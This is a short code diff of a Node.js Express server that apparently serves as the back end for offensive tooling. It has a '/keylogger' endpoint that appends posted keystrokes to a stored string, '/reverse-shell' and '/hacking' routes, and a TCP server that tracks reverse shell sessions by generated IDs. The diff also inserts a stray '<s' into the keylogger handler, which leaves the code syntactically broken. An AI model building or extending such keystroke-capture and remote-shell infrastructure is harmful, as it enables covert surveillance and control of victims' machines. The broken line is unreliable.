@@ -17,7 +17,7 @@ app.get(['/','/reverse-shell'], (req, res)=>{
 })
 
 app.get('/hacking', (req, res)=>{
-	res.send(fs.readFileSync(__dirname + '/html/hacking-gif.html').toString())
+  res.send(fs.readFileSync(__dirname + '/html/hacking-gif.html').toString())
 })
 
 var keys = ""
@@ -27,7 +27,7 @@ app.get('/keylogger', (req, res)=>{
 
 app.post('/keylogger', (req, res)=>{
   console.log(req)
-  keys += req.body.data
+  keys += req.body.data<s
   res.end()
 })
 
@@ -93,11 +93,11 @@ tcpServer.listen(tcpPort, ()=>{
 
 
 function generateID(){
-  var length = 8,
+  var length = 6,
   chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
-  result = ''
+  result = 'sh_'
 
-  while(reverseShellContainer[result] != null || result == ''){
+  while(reverseShellContainer[result] != null || result == 'sh_'){
     for(var i = 0; i < length; i++){
       result += chars.charAt(Math.floor(Math.random()*chars.length))
     }
